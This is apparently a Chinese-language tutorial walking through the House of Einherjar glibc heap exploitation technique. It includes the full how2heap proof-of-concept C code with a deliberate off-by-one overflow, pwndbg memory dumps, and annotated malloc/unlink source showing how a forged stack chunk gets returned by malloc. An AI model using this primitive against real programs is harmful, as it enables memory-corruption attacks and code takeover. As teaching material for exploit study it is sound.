# 前言
这一小节我们来看house of einherjar这种攻击方式。

# POC
## POC代码
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

/*
   Credit to st4g3r for publishing this technique
   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
*/

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("Welcome to House of Einherjar!\n");
	printf("Tested in Ubuntu 18.04.4 64bit.\n");
	printf("This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.\n");
	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	printf("\nWe allocate 0x38 bytes for 'a'\n");
	a = (uint8_t*) malloc(0x38);
	printf("a: %p\n", a);
   
	int real_a_size = malloc_usable_size(a);
	printf("Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);

	// create a fake chunk
	printf("\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
	printf("However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
	printf("We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
	printf("(although we could do the unsafe unlink technique here in some scenarios)\n");

	size_t fake_chunk[6];

	fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
	fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
	fake_chunk[2] = (size_t) fake_chunk; // fwd
	fake_chunk[3] = (size_t) fake_chunk; // bck
	fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
	fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize


	printf("Our fake chunk at %p looks like:\n", fake_chunk);
	printf("prev_size (not used): %#lx\n", fake_chunk[0]);
	printf("size: %#lx\n", fake_chunk[1]);
	printf("fwd: %#lx\n", fake_chunk[2]);
	printf("bck: %#lx\n", fake_chunk[3]);
	printf("fwd_nextsize: %#lx\n", fake_chunk[4]);
	printf("bck_nextsize: %#lx\n", fake_chunk[5]);

	/* In this case it is easier if the chunk size attribute has a least significant byte with
	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
	 * the chunk includes the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0x4f8);
	int real_b_size = malloc_usable_size(b);

	printf("\nWe allocate 0x4f8 bytes for 'b'.\n");
	printf("b: %p\n", b);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
	/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

	printf("\nb.size: %#lx\n", *b_size_ptr);
	printf("b.size is: (0x500) | prev_inuse = 0x501\n");
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	/* VULNERABILITY */
	a[real_a_size] = 0; 
	/* VULNERABILITY */
	printf("b.size: %#lx\n", *b_size_ptr);
	printf("This is easiest if b.size is a multiple of 0x100 so you "
		   "don't change the size of b, only its prev_inuse bit\n");
	printf("If it had been modified, we would need a fake chunk inside "
		   "b where it will try to consolidate the next chunk\n");

	// Write a fake prev_size to the end of a
	printf("\nWe write a fake prev_size to the last %lu bytes of a so that "
		   "it will consolidate with our fake chunk\n", sizeof(size_t));
	size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
	printf("Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
	*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;

	//Change the fake chunk's size to reflect b's new prev_size
	printf("\nModify fake chunk's size to reflect b's new prev_size\n");
	fake_chunk[1] = fake_size;

	// free b and it will consolidate with our fake chunk
	printf("Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
	free(b);
	printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

	//if we allocate another chunk before we free b we will need to 
	//do two things: 
	//1) We will need to adjust the size of our fake chunk so that
	//fake_chunk + fake_chunk's size points to an area we control
	//2) we will need to write the size of our fake chunk
	//at the location we control. 
	//After doing these two things, when unlink gets called, our fake chunk will
	//pass the size(P) == prev_size(next_chunk(P)) test. 
	//otherwise we need to make sure that our fake chunk is up against the
	//wilderness
	//

	printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
	d = malloc(0x200);
	printf("Next malloc(0x200) is at %p\n", d);

	assert((long)d == (long)&fake_chunk[2]);
}
```

注意看一下注释，这种攻击方式是有条件的。

## 攻击条件
在POC中已经说明了条件：

1. 程序具有off-by-one漏洞、堆溢出漏洞或其他方式可以修改下一个堆块相邻的mchunk_size和mchunk_prev_size。
2. 在小于glibc 2.27或glibc未开启tcache的版本中全部适用
3. 在大于等于glibc 2.27版本中之后的b堆块的大小需要超过0x408（也就是b堆块被释放后不能进入tcachebin中）

## POC解析
现在来分析一下POC吧，首先我们先malloc(0x38)：（b 36->r）

```c
	printf("Welcome to House of Einherjar!\n");
	printf("Tested in Ubuntu 18.04.4 64bit.\n");
	printf("This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.\n");
	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	printf("\nWe allocate 0x38 bytes for 'a'\n");
	a = (uint8_t*) malloc(0x38);
	printf("a: %p\n", a);
   
	int real_a_size = malloc_usable_size(a);
	printf("Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);
//Welcome to House of Einherjar!
//Tested in Ubuntu 18.04.4 64bit.
//This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.
//This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
//
//We allocate 0x38 bytes for 'a'
//a: 0x555555757260
//Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38
```

```c
pwndbg> x/100gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000041 #a--malloc(0x38)
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000000
0x555555757290:	0x0000000000000000	0x0000000000020d71 #top_chunk
......
0x555555757310:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

> malloc_usable_size：获取分配后chunk的user data大小，free后malloc_usable_size会返回0
>

然后我们在stack上伪造一个fake chunk（b 62-> c）：

```c
	// create a fake chunk
	printf("\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
	printf("However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
	printf("We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
	printf("(although we could do the unsafe unlink technique here in some scenarios)\n");

	size_t fake_chunk[6];

	fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
	fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
	fake_chunk[2] = (size_t) fake_chunk; // fwd
	fake_chunk[3] = (size_t) fake_chunk; // bck
	fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
	fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize


	printf("Our fake chunk at %p looks like:\n", fake_chunk);
	printf("prev_size (not used): %#lx\n", fake_chunk[0]);
	printf("size: %#lx\n", fake_chunk[1]);
	printf("fwd: %#lx\n", fake_chunk[2]);
	printf("bck: %#lx\n", fake_chunk[3]);
	printf("fwd_nextsize: %#lx\n", fake_chunk[4]);
	printf("bck_nextsize: %#lx\n", fake_chunk[5]);

//We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
//However, you can also create the chunk in the heap or the bss, as long as you know its address
//We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
//(although we could do the unsafe unlink technique here in some scenarios)
//Our fake chunk at 0x7fffffffdda0 looks like:
//prev_size (not used): 0x100
//size: 0x100
//fwd: 0x7fffffffdda0
//bck: 0x7fffffffdda0
//fwd_nextsize: 0x7fffffffdda0
//bck_nextsize: 0x7fffffffdda0
```

```c
pwndbg> x/16gx fake_chunk
0x7fffffffdda0:	0x0000000000000100	0x0000000000000100 #fake_chunk
				#fake_mchunk_prev_size #fake_mchunk_size
0x7fffffffddb0:	0x00007fffffffdda0	0x00007fffffffdda0
    			#fake_fd			#fake_bk
0x7fffffffddc0:	0x00007fffffffdda0	0x00007fffffffdda0
    			#fake_fd_nextsize   #fake_bk_nextsize
0x7fffffffddd0:	0x00007fffffffdec0	0xf909b2766ba8f000
0x7fffffffdde0:	0x0000555555554cb0	0x00007ffff7a03bf7
0x7fffffffddf0:	0x0000000000000001	0x00007fffffffdec8
0x7fffffffde00:	0x000000010000c000	0x00005555555548ea
0x7fffffffde10:	0x0000000000000000	0xf3b7ecd8324615b4
pwndbg> 
```

这个fake_chunk的各个指针也不是乱来的啊，~~它是有备而来~~，这个问题之后再说。

接下来我们再次malloc一个堆块，之前在开头说过如果系统开启了tcache机制，则其malloc大小要超过0x408（b 68 -> c），这里我们选择malloc大小为0x4f8的堆块：

```c
	b = (uint8_t*) malloc(0x4f8);
	int real_b_size = malloc_usable_size(b);

	printf("\nWe allocate 0x4f8 bytes for 'b'.\n");
	printf("b: %p\n", b);
//We allocate 0x4f8 bytes for 'b'.
//b: 0x5555557572a0
```

```c
pwndbg> x/300gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000041 #a--malloc(0x38)
......
0x555555757290:	0x0000000000000000	0x0000000000000501 #b--malloc(0x4f8)
......
0x555555757790:	0x0000000000000000	0x0000000000020871 #top_chunk
......
0x555555757950:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

为了方便展示b chunk的大小，这里POC选择创建了一个指针指向b chunk的mchunk_size（b 72->c）：

```c
	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
	/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

	printf("\nb.size: %#lx\n", *b_size_ptr);
//b.size: 0x501
```

```c
pwndbg> x/300gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000041 #a--malloc(0x38)
......
0x555555757290:	0x0000000000000000	0x0000000000000501 #b--malloc(0x4f8)
    								#b_size_ptr==0x555555757298
......
0x555555757790:	0x0000000000000000	0x0000000000020871 #top_chunk
......
0x555555757950:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

接下来就是漏洞的所在之处，假如说现在有一个堆溢出漏洞或off-by-one漏洞可以修改b chunk的mchunk_size和mchunk_prev_size（b 91->c）：

```c
	printf("b.size is: (0x500) | prev_inuse = 0x501\n");
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	/* VULNERABILITY */
	a[real_a_size] = 0; 
	/* VULNERABILITY */
	printf("b.size: %#lx\n", *b_size_ptr);
	// Write a fake prev_size to the end of a
	printf("\nWe write a fake prev_size to the last %lu bytes of a so that "
		   "it will consolidate with our fake chunk\n", sizeof(size_t));
	size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
	printf("Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
	*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
//We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
//Our fake prev_size will be 0x555555757290 - 0x7fffffffdda0 = 0xffffd555557594f0
```

效果如下：

```c
pwndbg> x/300gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000041 #a--malloc(0x38)
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000000
0x555555757290:	0xffffd555557594f0	0x0000000000000500 #b--malloc(0x4f8)
    			#changed		   #0x0000000000000501 /* VULNERABILITY */
    							   #b_size_ptr==0x555555757298
......
0x555555757790:	0x0000000000000000	0x0000000000020871 #top_chunk
......
0x555555757950:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

这里来看一下为什么我们要将b堆块的mchunk_prev_size，之前我们在stack上伪造了一个fake_chunk，换句话说我们想要控制这个地址，这个fake_chunk的地址为0x7fffffffdda0，现在b堆块的**<font style="color:#F5222D;">起始</font>**地址为0x555555757290，因为我们在之后的free过程中想使用b堆块的mchunk_prev_size进行与fake_chunk进行合并，因此这里需要计算两者的距离。

接下来设置fake chunk的mchunk_size，这个的设置是必须的，原因之后再说b 95->c：

```c
	//Change the fake chunk's size to reflect b's new prev_size
	printf("\nModify fake chunk's size to reflect b's new prev_size\n");
	fake_chunk[1] = fake_size;
```

```c
pwndbg> x/16gx fake_chunk
0x7fffffffdda0:	0x0000000000000100	0xffffd555557594f0 #fake_chunk
									#changed
				#fake_mchunk_prev_size #fake_mchunk_size
0x7fffffffddb0:	0x00007fffffffdda0	0x00007fffffffdda0
    			#fake_fd			#fake_bk
0x7fffffffddc0:	0x00007fffffffdda0	0x00007fffffffdda0
    			#fake_fd_nextsize   #fake_bk_nextsize
0x7fffffffddd0:	0x00007fffffffdec0	0xf909b2766ba8f000 #这些内存不重要
0x7fffffffdde0:	0x0000555555554cb0	0x00007ffff7a03bf7 #这些内存不重要
0x7fffffffddf0:	0x0000000000000001	0x00007fffffffdec8 #这些内存不重要
0x7fffffffde00:	0x000000010000c000	0x00005555555548ea #这些内存不重要
0x7fffffffde10:	0x0000000000000000	0xf3b7ecd8324615b4 #这些内存不重要
pwndbg> 
```

接下来到了重点，我们重点来看这个free函数，b 97->c：

```c
	// free b and it will consolidate with our fake chunk
	printf("Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
	free(b);
```

这里引入malloc源码进行调试：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620831515630-d85972f1-8400-4393-b90b-d25289d7cb57.png)

重要检查源码如下：

```c
    nextchunk = chunk_at_offset(p, size); //nextchunk==0x555555757790
			//0x555555757290+0x500==0x555555757790（这个地址是top_chunk的起始地址）
    /* Lightweight tests: check whether the block is already the
       top block.  */
    if (__glibc_unlikely (p == av->top)) //检查p堆块是否为top_chunk
      malloc_printerr ("double free or corruption (top)");
    /* Or whether the next chunk is beyond the boundaries of the arena.  */
    if (__builtin_expect (contiguous (av)
			  && (char *) nextchunk
			  >= ((char *) av->top + chunksize(av->top)), 0)) //判断nextchunk是否超出heap区
	malloc_printerr ("double free or corruption (out)");
    /* Or whether the block is actually not marked used.  */
    if (__glibc_unlikely (!prev_inuse(nextchunk))) //检查nextchunk的PREV_INUSE是否为1
      malloc_printerr ("double free or corruption (!prev)");

    nextsize = chunksize(nextchunk); //nextsize==0x20871
    if (__builtin_expect (chunksize_nomask (nextchunk) <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (nextsize >= av->system_mem, 0)) //检查nextchunk大小的有效性
      malloc_printerr ("free(): invalid next size (normal)");
```

然后就是下面这些内容：

```c
    /* consolidate backward */
    if (!prev_inuse(p)) { //prev_inuse(p)==0
        //进入向后合并
      prevsize = prev_size (p); //prevsize==0xffffd555557594f0
      size += prevsize; //size==size+prevsize==0xffffd555557594f0+0x500==0xffffd555557599f0
      p = chunk_at_offset(p, -((long) prevsize)); 
        //p==0x555555757290-0xffffd555557594f0==0x7fffffffdda0（stack上的fake_chunk地址）
      unlink(av, p, bck, fwd);
    }
```

然后进入unlink（之前说过，这里就不详细说了）：

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))  【检查1】    
      malloc_printerr ("corrupted size vs. prev_size");			      
    FD = P->fd;						      
    BK = P->bk;								      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))	【检查2】	      
      malloc_printerr ("corrupted double-linked list");			      
    else {								      
        FD->bk = BK;							     
        BK->fd = FD;							      
        	//......							      
      }									      
}
```

```c
pwndbg> x/16gx fake_chunk
0x7fffffffdda0:	0x0000000000000100	0xffffd555557594f0 #fake_chunk ###（P）
//next_chunk(P)==next_chunk(0x7fffffffdda0)==0x7fffffffdda0+0xffffd555557594f0
//            							   ==0x555555757290
//prev_size(0x555555757290)==0xffffd555557594f0
#【检查1】:prev_size (next_chunk(P))==0xffffd555557594f0
0x7fffffffddb0:	0x00007fffffffdda0	0x00007fffffffdda0
    			#fake_fd			#fake_bk
0x7fffffffddc0:	0x00007fffffffdda0	0x00007fffffffdda0
    			#fake_fd_nextsize   #fake_bk_nextsize
0x7fffffffddd0:	0x00007fffffffdec0	0xf909b2766ba8f000 #这些内存不重要
0x7fffffffdde0:	0x0000555555554cb0	0x00007ffff7a03bf7 #这些内存不重要
0x7fffffffddf0:	0x0000000000000001	0x00007fffffffdec8 #这些内存不重要
0x7fffffffde00:	0x000000010000c000	0x00005555555548ea #这些内存不重要
0x7fffffffde10:	0x0000000000000000	0xf3b7ecd8324615b4 #这些内存不重要
--------------------------------------------------------------------
pwndbg> x/300gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000041 #a--malloc(0x38)
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000000
0x555555757290:	0xffffd555557594f0	0x0000000000000500 #b--malloc(0x4f8)
									#【检查1】:chunksize(P)==0x500
......
0x555555757790:	0x0000000000000000	0x0000000000020871 #top_chunk
......
0x555555757950:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

```c
    FD = P->fd;	//FD==0x00007fffffffdda0->fd==0x00007fffffffdda0		      
    BK = P->bk;	//BK==0x00007fffffffdda0->bk==0x00007fffffffdda0
```

```c
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))	【检查2】	      
      malloc_printerr ("corrupted double-linked list");		
//FD->bk==0x00007fffffffdda0->bk==0x00007fffffffdda0==P
//BK->fd==0x00007fffffffdda0->fd==0x00007fffffffdda0==P
```

继续看一下unlink中的步骤：

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            
	......	      
    else {//FD==BK==0x00007fffffffdda0						      
        FD->bk = BK; 
        BK->fd = FD;
pwndbg> x/16gx 0x7fffffffdda0
0x7fffffffdda0:	0x0000000000000100	0xffffd555557594f0 #fake_chunk  ###（P）
0x7fffffffddb0:	0x00007fffffffdda0	0x00007fffffffdda0
    			#fake_fd			#fake_bk
0x7fffffffddc0:	0x00007fffffffdda0	0x00007fffffffdda0
    			#fake_fd_nextsize   #fake_bk_nextsize
0x7fffffffddd0:	0x00007fffffffdec0	0xf909b2766ba8f000 #这些内存不重要
0x7fffffffdde0:	0x0000555555554cb0	0x00007ffff7a03bf7 #这些内存不重要
0x7fffffffddf0:	0x0000000000000001	0x00007fffffffdec8 #这些内存不重要
0x7fffffffde00:	0x000000010000c000	0x00005555555548ea #这些内存不重要
0x7fffffffde10:	0x0000000000000000	0xf3b7ecd8324615b4 #这些内存不重要
//执行完如上两步后内存未发生变化
        if (!in_smallbin_range (chunksize_nomask (P))	
            	//chunksize_nomask (P)==0xffffd555557594f0
            	//P->fd_nextsize==0x00007fffffffdda0
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {	
            	//进入if语句
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)//【检查3】      
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))//【检查4】    
	      malloc_printerr ("corrupted double-linked list (not small)");   
            if (FD->fd_nextsize == NULL) {
                if (P->fd_nextsize == P)
                  FD->fd_nextsize = FD->bk_nextsize = FD;	
                else {							      
                    FD->fd_nextsize = P->fd_nextsize;			      
                    FD->bk_nextsize = P->bk_nextsize;			      
                    P->fd_nextsize->bk_nextsize = FD;			      
                    P->bk_nextsize->fd_nextsize = FD;			      
                  }							      
              } else {	//进入else分支					      
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;	
                #到此结束unlink
                #内存和之前的一样，没有发生变化
              }								      
          }								      
      }									      
}
```

上面这些内容就体现出了之前的fake_chunk为什么这样伪造😊。

（我原以为fake chunk中伪造的fd_nextsize和bk_nextsize是没有用的，现在看来是我格局小了，因为chunksize_nomask (P)==0xffffd555557594f0属于large chunk，因此要绕过检查，另外fake chunk中的指针伪造的真巧妙）。

```c
    if (nextchunk != av->top) { //下一个chunk不是top_chunk
 		//......
    }

    /*
      If the chunk borders the current high end of memory,
      consolidate into top
    */

    else { //下一个chunk是top_chunk
      size += nextsize; 
        	//size==size+nextsize==0xffffd555557599f0+0x20871==0xffffd5555577a261
      set_head(p, size | PREV_INUSE);
      av->top = p;
      check_chunk(av, p);
    }
#set_head(p, size | PREV_INUSE)：
pwndbg> x/16gx 0x7fffffffdda0
0x7fffffffdda0:	0x0000000000000100	0xffffd5555577a261 #fake_chunk
								   #0xffffd555557594f0
                                   #changed
0x7fffffffddb0:	0x00007fffffffdda0	0x00007fffffffdda0 ###（P）
    			#fake_fd			#fake_bk
0x7fffffffddc0:	0x00007fffffffdda0	0x00007fffffffdda0
    			#fake_fd_nextsize   #fake_bk_nextsize
0x7fffffffddd0:	0x00007fffffffdec0	0xf909b2766ba8f000 #这些内存不重要
0x7fffffffdde0:	0x0000555555554cb0	0x00007ffff7a03bf7 #这些内存不重要
0x7fffffffddf0:	0x0000000000000001	0x00007fffffffdec8 #这些内存不重要
0x7fffffffde00:	0x000000010000c000	0x00005555555548ea #这些内存不重要
0x7fffffffde10:	0x0000000000000000	0xf3b7ecd8324615b4 #这些内存不重要
#av->top = p;
#p==0x7fffffffdda0
pwndbg> p av->top
$15 = (mchunkptr) 0x7fffffffdda0
pwndbg> 
pwndbg> x/16gx 0x7fffffffdda0
0x7fffffffdda0:	0x0000000000000100	0xffffd5555577a261 #fake_chunk #!!!top_chunk
								   #0xffffd555557594f0
                                   #changed
0x7fffffffddb0:	0x00007fffffffdda0	0x00007fffffffdda0 ###（P）
    			#fake_fd			#fake_bk
0x7fffffffddc0:	0x00007fffffffdda0	0x00007fffffffdda0
    			#fake_fd_nextsize   #fake_bk_nextsize
0x7fffffffddd0:	0x00007fffffffdec0	0xf909b2766ba8f000 #这些内存不重要
0x7fffffffdde0:	0x0000555555554cb0	0x00007ffff7a03bf7 #这些内存不重要
0x7fffffffddf0:	0x0000000000000001	0x00007fffffffdec8 #这些内存不重要
0x7fffffffde00:	0x000000010000c000	0x00005555555548ea #这些内存不重要
0x7fffffffde10:	0x0000000000000000	0xf3b7ecd8324615b4 #这些内存不重要
```

现在top_chunk已经被“转移到了top_chunk”，当我们再次malloc时就可以控制stack memory

```c
	printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
	d = malloc(0x200);
	printf("Next malloc(0x200) is at %p\n", d);
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620865293270-64fa037a-ee42-43e8-93d9-750bfa444fd3.png)

# 疑问
Q：**<font style="color:#F5222D;">POC中fake_chunk的fd_nextsize和bk_nextsize的伪造是必须的吗，我能不能可以不伪造这两个地方？</font>**

```c
	fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
	fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
	fake_chunk[2] = (size_t) fake_chunk; // fwd
	fake_chunk[3] = (size_t) fake_chunk; // bck
	fake_chunk[4] = NULL; //fwd_nextsize
	fake_chunk[5] = NULL; //bck_nextsize
```

当然可以，我们在这里再来看一下unlink的过程，现在假如说fake chunk的fd_nextsize和bk_nextsize==NULL：

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      
      malloc_printerr ("corrupted size vs. prev_size");			      
    FD = P->fd;								      
    BK = P->bk;								      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
      malloc_printerr ("corrupted double-linked list");			      
    else {								      
        FD->bk = BK;							      
        BK->fd = FD;							      
        if (!in_smallbin_range (chunksize_nomask (P))			      
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {	//现在P->fd_nextsize==NULL      
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    
	      malloc_printerr ("corrupted double-linked list (not small)");   
            if (FD->fd_nextsize == NULL) {				      
                if (P->fd_nextsize == P)				      
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      
                else {							      
                    FD->fd_nextsize = P->fd_nextsize;			      
                    FD->bk_nextsize = P->bk_nextsize;			      
                    P->fd_nextsize->bk_nextsize = FD;			      
                    P->bk_nextsize->fd_nextsize = FD;			      
                  }							      
              } else {							      
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      
              }								      
          }	 //不会进入if语句，跳出unlink							      
      }									      
}
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620865596987-413afd0e-fbab-44d7-a709-acb509faf62e.png)

这里来猜测一下为什么要加上fd_nextsize和bk_nextsize：

这两个指针是largebin独有的指针，也就是说这里的fake_chunk也可以是largebin上的一个free堆块

（当然，直接向处于malloc状态写入内容或处于循环双向链表free的chunk也可以），只要可以绕过unlink的安全性检查即可：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620865973104-72470230-e06f-44f1-8e93-54f1f2a75c4d.png)

> 借用一下之前文章中的图片
>

POC的适用性更广罢了，2333～

